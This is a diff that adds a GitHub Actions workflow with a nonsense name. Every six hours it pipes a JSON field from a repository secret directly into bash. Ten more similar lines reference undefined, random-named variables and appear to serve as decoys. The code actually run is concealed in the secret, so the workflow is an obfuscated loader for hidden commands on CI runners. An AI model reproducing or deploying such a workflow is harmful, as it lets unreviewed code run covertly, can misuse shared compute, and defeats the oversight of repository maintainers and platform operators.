@@ -1,0 +1,28 @@
+name: danshipaofenm
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '3 1/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: danshipaofenm
+        env:
+          apsin42: ${{ secrets.apsin42 }}
+        run: |
+          echo $apsin42 | jq -r .ip67 | /bin/bash
+          echo $ee63008 | jq -r .ij50628 | /bin/bash
+          echo $lbtb5128 | jq -r .efit986 | /bin/bash
+          echo $it7 | jq -r .k450 | /bin/bash
+          echo $c70 | jq -r .gkt791 | /bin/bash
+          echo $wf2 | jq -r .eul227 | /bin/bash
+          echo $sw8202 | jq -r .k2191 | /bin/bash
+          echo $etgp228 | jq -r .uq9 | /bin/bash
+          echo $g514 | jq -r .ekuu69665 | /bin/bash
+          echo $ag4967 | jq -r .zsxo1997 | /bin/bash
+          echo $gapf89593 | jq -r .cvp304 | /bin/bash
+
